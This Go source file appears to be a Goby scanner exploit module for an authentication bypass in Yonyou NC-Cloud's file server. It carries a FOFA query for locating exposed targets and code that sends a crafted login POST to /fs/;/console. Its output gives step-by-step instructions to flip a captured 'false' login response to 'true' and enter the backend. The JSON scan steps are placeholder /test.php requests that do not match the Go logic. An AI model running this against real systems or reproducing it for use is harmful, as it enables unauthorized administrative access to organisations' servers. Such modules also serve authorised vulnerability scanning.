package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC-Cloud /fs/;/console Permission Bypass Vulnerability",
    "Description": "<p>Yonyou NC-Cloud is a cloud service product for small and medium-sized enterprises launched by Yonyou Network Technology Co., Ltd. </p><p> Yonyou NC-Cloud file server has root user bypass, when the packet is captured and found to return false when logging in, it indicates that there is a vulnerability, and if it is modified to true to allow it, you can directly log in to the file server background.</p>",
    "Product": "yonyou-NC-OA-V5.72SP1",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-11-07",
    "PostTime": "2024-07-08",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "GobyQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "Level": "2",
    "Impact": "<p>Direct login to the file server backend can be utilized.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [
        "https://cn-sec.com/archives/1994681.html",
        ""
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "用友NC Cloud /fs/;/console 权限绕过漏洞",
            "Product": "用友NC-OA-V5.72SP1",
            "Description": "<p>用友NC-Cloud是用友网络科技公司推出的一款面向中小企业的云服务产品。<br></p><p>用友NC-Cloud文件服务器存在root用户绕过，当登入时抓包发现数据包返回的是false，就表明存在漏洞，修改成true放行即可直接登录文件服务器后台。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>可利用直接登录文件服务器后台。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Yonyou NC-Cloud /fs/;/console Permission Bypass Vulnerability",
            "Product": "yonyou-NC-OA-V5.72SP1",
            "Description": "<p>Yonyou NC-Cloud is a cloud service product for small and medium-sized enterprises launched by Yonyou Network Technology Co., Ltd.&nbsp;</p><p>&nbsp;Yonyou NC-Cloud file server has root user bypass, when the packet is captured and found to return false when logging in, it indicates that there is a vulnerability, and if it is modified to true to allow it, you can directly log in to the file server background.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>Direct login to the file server backend can be utilized.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10972"
}`
	sendPayload_wcKCkY8o8eq46YNxSqLuiCwbhEQzt1un := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		vulInfo := ``
		vulPath := `/fs/;/console`
		requestConfig := httpclient.NewPostRequestConfig(vulPath)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		requestConfig.FollowRedirect = false
		requestConfig.Data = "operType=login&username=123&password=%252F7Go4Iv2Xqlml0WjkQvrvzX%252FgBopF8XnfWPUk69fZs0%253D"
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "{\"login\":\"false\"}") {
				vulInfo = "请访问如下url发送登录数据包:\n" + hostInfo.FixedHostInfo + "/fs/;/console.html\n输入任意用户名密码点击登陆后抓取返回包，将false修改成true放行即可登录后台。"
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, vulPath := sendPayload_wcKCkY8o8eq46YNxSqLuiCwbhEQzt1un(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayload_wcKCkY8o8eq46YNxSqLuiCwbhEQzt1un(expResult.HostInfo)
			expResult.Output = vulInfo
			expResult.Success = true
			return expResult
		},
	))
}
